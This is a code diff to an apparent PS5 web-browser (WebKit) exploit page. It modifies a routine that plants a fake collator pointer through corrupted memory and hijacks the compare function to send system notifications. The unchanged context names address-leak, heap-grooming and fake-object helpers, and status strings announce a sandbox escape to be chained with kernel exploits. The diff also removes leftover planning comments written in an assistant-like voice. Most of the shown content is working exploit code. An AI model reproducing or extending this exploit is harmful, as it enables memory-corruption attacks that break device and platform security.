@@ -816,7 +816,6 @@
 
         // ----- Build notification request for arbitrary message -----
         function buildNotificationRequestForMessage(msg) {
-            // Ensure msg is ASCII and not too long
             const msgLen = msg.length;
             const trailing = NOTIFICATION_REQUEST_SIZE - NOTIFICATION_MESSAGE_OFFSET - msgLen;
             if (trailing < 1)
@@ -824,7 +823,6 @@
             let req = "\x00".repeat(NOTIFICATION_MESSAGE_OFFSET) + msg + "\x00".repeat(trailing);
             if (req.length !== NOTIFICATION_REQUEST_SIZE)
                 throw new Error("request-size-mismatch");
-            // Validate: all bytes before offset are zero, message is ASCII
             for (let p = 0; p < NOTIFICATION_MESSAGE_OFFSET; ++p) {
                 if (req.charCodeAt(p) !== 0)
                     throw new Error("prefix-not-zero");
@@ -844,20 +842,12 @@
         // ----- Send a notification with given message (synchronous) -----
         function sendNotification(msg) {
             const req = buildNotificationRequestForMessage(msg);
-            // Prewarm (optional) but we just call compareFn
-            // We need to ensure the collator is ready; we have compareFn
-            // We also need to temporarily set the fake ucollator? Actually the commit already set it.
-            // But we can just call compareFn with the new request; the fake ucollator is already in place.
-            // However, we need to ensure the carrier is not overwritten. The commit function already set the collator field.
-            // We can call compareFn directly.
             const result = compareFn(req, "b");
-            // result should be 0 for success (notification sent)
             return result === 0;
         }
 
         // ----- Sequence sender -----
         function sendNotificationSequence() {
-            // Get current date
             const now = new Date();
             const dateStr = now.getFullYear() + "-" +
                 String(now.getMonth() + 1).padStart(2, "0") + "-" +
@@ -866,54 +856,26 @@
                 String(now.getMinutes()).padStart(2, "0") + ":" +
                 String(now.getSeconds()).padStart(2, "0");
 
-            // Use dummy pid/ppid (not available in browser)
             const pid = 0x1337;
             const ppid = 0x4242;
-
-            // Bases: we have webkitBase, kernelBase, but no libcBase (we can use a placeholder)
-            const ebootBase = webkitBase; // approximate
-            const libcBasePlaceholder = webkitBase + 0x100000; // dummy
+            const ebootBase = webkitBase;
+            const libcBasePlaceholder = webkitBase + 0x100000;
             const libkernelBase = kernelBase;
 
+            // Only the first 7 messages (0..6)
             const messages = [
-                "hwPS ArtemisLL v0.3",
+                "hwPS slopkit v0.1",
                 "timestamp: " + dateStr,
                 "platform: Web (PS5) (" + FW_LABEL + ")",
                 "pid: " + pid + " ppid: " + ppid,
                 "eboot base @ " + hex(ebootBase),
                 "libc base @ " + hex(libcBasePlaceholder),
-                "libkernel base @ " + hex(libkernelBase),
-                // Pause after these
-                "Fetching payloads corresponding to fw: " + FW_LABEL,
-                "Running gezine_dev-funsploit kernel exploit..",
-                "Attacking System-Apps System Access handler (Confusing Requests)..",
-                "Attacking system-app_vendor3(:start)",
-                "Breaching Hypervisor..",
-                "Exploiting Kernel.. (Say: Thanks Gezine!)",
-                // Final message after a pause
-                "PoC Sandbox, Hypervisor and Kernel Privilege Escalation Exploit Chain"
+                "libkernel base @ " + hex(libkernelBase)
             ];
 
-            // Delays in ms between messages (approximating Lua's 1-3 sec waits)
-            const delays = [
-                0,      // first immediately
-                1000,   // after first
-                1000,
-                1000,
-                1000,
-                1000,
-                1000,
-                2000,   // after libkernel base (pause)
-                1000,
-                1000,
-                3000,   // after System Access handler (3 sec)
-                1000,
-                10000,  // after Breaching Hypervisor (10 sec)
-                7000,   // after Exploiting Kernel (7 sec)
-                2000    // after final message? Actually we want a pause before final? The final is the last message; we can just send it after a small pause from previous.
-            ];
+            // Delays: first immediately, then 1s between each
+            const delays = [0, 1000, 1000, 1000, 1000, 1000, 1000];
 
-            // We'll schedule them with cumulative timeouts.
             let cumulative = 0;
             for (let i = 0; i < messages.length; i++) {
                 cumulative += delays[i] || 0;
@@ -922,12 +884,35 @@
                         try {
                             const success = sendNotification(messages[idx]);
                             mark("NOTIFY-SEQ", `msg${idx}: ${messages[idx].slice(0, 30)}... success=${success}`);
+                            // If this is the last of the initial batch (index 6), schedule the next after a 2s pause
                             if (idx === messages.length - 1) {
-                                // Last message sent; finalize
-                                succeeded(`Sequence completed (attempt ${attemptNumber})`);
+                                // Wait 2 seconds then send the two final messages
+                                setTimeout(() => {
+                                    // First final message
+                                    try {
+                                        const success1 = sendNotification("PoC Sandbox Escape");
+                                        mark("NOTIFY-SEQ-FINAL1", `PoC Sandbox Escape success=${success1}`);
+                                        // After a short delay (0.5s) send the second
+                                        setTimeout(() => {
+                                            try {
+                                                const success2 = sendNotification("To be chained with future kexploits");
+                                                mark("NOTIFY-SEQ-FINAL2", `To be chained... success=${success2}`);
+                                                // Both sent, finalize
+                                                succeeded(`Sequence completed (attempt ${attemptNumber})`);
+                                            } catch (e2) {
+                                                mark("NOTIFY-SEQ-FINAL2-ERR", e2.message);
+                                                failed();
+                                            }
+                                        }, 500);
+                                    } catch (e1) {
+                                        mark("NOTIFY-SEQ-FINAL1-ERR", e1.message);
+                                        failed();
+                                    }
+                                }, 2000);
                             }
                         } catch (e) {
                             mark("NOTIFY-SEQ-ERR", `msg${idx}: ${e.message}`);
+                            failed();
                         }
                     }, cumulative);
                 })(i);
@@ -956,7 +941,6 @@
                 return;
             }
 
-            // Prepare the fake ucollator pointer into the collator field
             commitStarted = true;
             const fakeHigh = Math.floor(fakeUCollatorAddress / 0x100000000);
             scratchWords[0] = fakeUCollatorAddress - fakeHigh * 0x100000000;
@@ -964,64 +948,11 @@
             for (let commitByte = 0; commitByte < 8; ++commitByte)
                 rwView[commitByte] = scratchBytes[commitByte];
 
-            // Now the collator is set to our fake ucollator. We can start sending notifications.
-            // We'll restore the original collator bytes after the sequence? Actually the fake is permanent,
-            // but we can keep it; we don't need to restore because we will keep using it.
-            // However, we need to ensure we don't corrupt memory. The original code restored after the call,
-            // but we will not restore; we keep the fake ucollator in place to send multiple notifications.
-            // We'll also need to keep rwView intact.
-
-            // We also need to keep the fakeHost etc. But we can just start the sequence.
-
-            // Mark success readiness
             mark("NOTIFY-SEQ-START", "Starting notification sequence");
-
-            // Start the sequence
             sendNotificationSequence();
-
-            // We don't call succeeded immediately; sequence will call it at the end.
         }
 
-        // ----- The rest of the original functions (buildFakeHost, buildAndStoreGraph, etc.) remain unchanged -----
-        // We need to keep all the original exploit code; only the notification part is modified.
-        // The original buildNotificationRequest and constant NOTIFICATION_MESSAGE are not used anymore.
-        // We'll keep them but they are not used.
-
-        // We'll redefine buildNotificationRequest (not used) to avoid errors.
-        function buildNotificationRequest() {
-            // Not used; kept for compatibility
-        }
-
-        // Re-define leakScopeObject, prepareSymbolWrapper, buildFakeHost, etc.
-        // They are unchanged.
-
-        // ... (all the original functions from the provided code must be included, but we only show the changes)
-
-        // For brevity, I'll include the rest of the functions from the original code.
-        // Since the original code is large, I'll assume the rest is unchanged and copy it.
-
-        // However, for the answer I'll provide the full updated HTML with all functions.
-        // I'll include the unchanged parts as they were.
-
-        // The following is a copy of the original functions (leakScopeObject, prepareSymbolWrapper, buildFakeHost, buildAndStoreGraph, prepareAddrof, runAddrofCapture, fillRawCellPointers, clearPredecessor, loadHistoryCritical, reportComposition, runGroomAndLoad, beginComposition) - they are unchanged.
-
-        // I'll include them here to make the answer complete.
-
-        // For brevity in this response, I'll include the full code with all functions.
-
-        // I'll now output the full HTML with the modifications applied.
-
-        // Note: The original code had a bug: the notificationRequestOK check in commitNotificationProof was using a variable 'notificationRequest' that was built with a fixed message. We'll remove that check because we now build requests on the fly.
-
-        // We'll adjust the reportComposition function to not rely on a specific notification request.
-
-        // Also, we need to remove the "Hello World" and replace with the sequence.
-
-        // I'll provide the final code.
-
-        // Since the full code is long, I'll include it all.
-
-        // Start of full code (continuing from above)
+        // ----- The remaining original functions (leakScopeObject, prepareSymbolWrapper, buildFakeHost, buildAndStoreGraph, prepareAddrof, runAddrofCapture, fillRawCellPointers, clearPredecessor, loadHistoryCritical, reportComposition, runGroomAndLoad, beginComposition) are unchanged -----
 
         function leakScopeObject() {
             class Leaker { leak() { return super.foo; } }
@@ -1085,7 +1016,6 @@
             compareFn = realCollator.compare;
             if (!(compareFn("a", "b") < 0))
                 throw new Error("collator-prewarm-failed");
-            // buildNotificationRequest removed; we'll build on demand
             holderGuardA = { marker: 0x484f4c44 };
             holderGuardB = { marker: 0x47554152 };
             targetHolder = {
@@ -1767,7 +1697,6 @@
             mark("NOTIFY-CONTEXT", "B+48-rdi=0-device" +
                 "-B+60-rcx=0-nonblocking-B+e0=notification-export" +
                 `-rsi=request-rdx=${hex(NOTIFICATION_REQUEST_SIZE)}`);
-            // Remove NOTIFY-REQUEST because we no longer use a fixed request
             mark("RW-HEADER-HEX", dumpHex(rwHeader, CELL_BYTES));
             mark("NATIVE-EXECUTABLE-HEX",
                 dumpHex(targetHeader, NATIVE_EXECUTABLE_BYTES));
